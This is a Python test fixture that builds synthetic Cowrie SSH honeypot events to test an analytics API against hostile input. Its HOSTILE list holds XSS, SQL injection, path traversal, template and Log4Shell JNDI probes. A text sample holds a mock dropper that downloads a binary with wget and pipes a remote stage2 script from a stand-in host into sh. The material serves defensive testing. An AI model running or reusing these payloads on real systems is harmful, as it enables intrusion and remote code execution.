"""A small synthetic dataset for the API tests, built through the real pipeline.

Every value an attacker controls in a real session is filled with something
hostile here: markup, script URLs, SQL, path traversal, format-string and
template probes, terminal escapes, bidirectional overrides, a NUL, and an
oversized string. Addresses come from the documentation ranges, so nothing in
this file identifies a real host or a real sensor.

The events go into raw_events exactly as ingest writes them, and the same
worker stages the collector runs then build every table the API reads. A test
that uses this fixture exercises the pipeline end to end rather than a
hand-assembled set of rollup rows that might not match what the worker makes.
"""

import datetime as dt
import hashlib
import json
import os

HOSTILE = [
    "<script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "javascript:alert(document.domain)",
    "' OR '1'='1' --",
    "'; DROP TABLE raw_events; --",
    "../../../../etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "{{7*7}}${7*7}<%= 7*7 %>",
    "${jndi:ldap://203.0.113.9/a}",
    "\u202eexe.gnp",
    "\x1b[2J\x1b[31mred\x07",
    "nul\x00byte",
    "A" * 4096,
]

SOURCES = ["192.0.2.%d" % i for i in range(10, 20)] + ["198.51.100.%d" % i for i in range(10, 15)]

# A binary sample with a byte pattern no text rendering would ever produce, so
# its appearance in any response means sample bytes leaked.
BINARY_MARKER = b"\x7fELF\x02\x01\x01\x00" + b"\x13\x37\xde\xad\xbe\xef\xca\xfe" * 16
TEXT_SAMPLE = (b"#!/bin/sh\ncd /tmp\nwget http://203.0.113.50/bins/x86 -O .x\n"
               b"curl -s https://drop.example.com/stage2.sh | sh\n" + b"# pad\n" * 30)


def _ts(minutes_ago):
    t = dt.datetime.now(dt.timezone.utc) - dt.timedelta(minutes=minutes_ago)
    return t.strftime("%Y-%m-%dT%H:%M:%S.%fZ")


def _event(con, n, eventid, session, src, minutes_ago, **fields):
    body = dict(fields, eventid=eventid, session=session, src_ip=src,
                timestamp=_ts(minutes_ago))
    line = json.dumps(body)
    con.execute(
        "INSERT OR IGNORE INTO raw_events(line_hash,eventid,session,src_ip,ts,payload)"
        " VALUES(?,?,?,?,?,?)",
        (hashlib.sha256(line.encode()).hexdigest() + str(n), eventid, session, src,
         body["timestamp"], line),
    )


def build(con, worker, sample_dir):
    """Fill the database and the sample directory, then run the worker stages."""
    shas = {}
    for name, body in (("binary", BINARY_MARKER), ("text", TEXT_SAMPLE)):
        sha = hashlib.sha256(body).hexdigest()
        with open(os.path.join(sample_dir, sha), "wb") as fh:
            fh.write(body)
        shas[name] = sha

    n = 0
    for i, src in enumerate(SOURCES):
        hostile = HOSTILE[i % len(HOSTILE)]
        for s in range(3):
            session = "%08x%04x" % (i, s)
            minutes = 30 + i * 90 + s * 7
            n += 1; _event(con, n, "cowrie.session.connect", session, src, minutes,
                           src_port=40000 + s, dst_ip="192.0.2.1", dst_port=22)
            n += 1; _event(con, n, "cowrie.client.version", session, src, minutes,
                           version="SSH-2.0-" + hostile[:200])
            n += 1; _event(con, n, "cowrie.client.kex", session, src, minutes,
                           hassh="%032x" % (i % 4), hasshAlgorithms=hostile[:120])
            for attempt, (user, pw) in enumerate(((hostile, "123456"), ("root", hostile))):
                n += 1; _event(con, n, "cowrie.login.failed", session, src,
                               minutes - attempt, username=user, password=pw)
            n += 1; _event(con, n, "cowrie.login.success", session, src, minutes - 2,
                           username="admin", password=hostile)
            n += 1; _event(con, n, "cowrie.command.input", session, src, minutes - 3,
                           input=hostile)
            if s == 0:
                n += 1; _event(con, n, "cowrie.session.file_download", session, src, minutes - 4,
                               shasum=shas["binary" if i % 2 else "text"],
                               url="http://203.0.113.50/" + hostile[:60],
                               destfile="/tmp/" + hostile[:40], outfile="var/lib/cowrie/downloads/x")
                n += 1; _event(con, n, "cowrie.direct-tcpip.request", session, src, minutes - 5,
                               dst_ip="203.0.113.77", dst_port=443, src_port=5555)
            n += 1; _event(con, n, "cowrie.session.closed", session, src, minutes - 6, duration=12.5)
    con.commit()

    for stage in (worker.build_facts, worker.build_sessions, worker.build_tunnels,
                  worker.build_payloads, worker.build_entities, worker.build_credentials):
        stage(con, True)
    worker.fpmod.rebuild(con, True, worker.RECENT_DAYS)
    worker.escmod.rebuild(con)
    worker.escmod.rebuild_daily(con, True, worker.RECENT_DAYS)
    worker.spikemod.annotate(con, force=True)
    con.commit()
    return shas
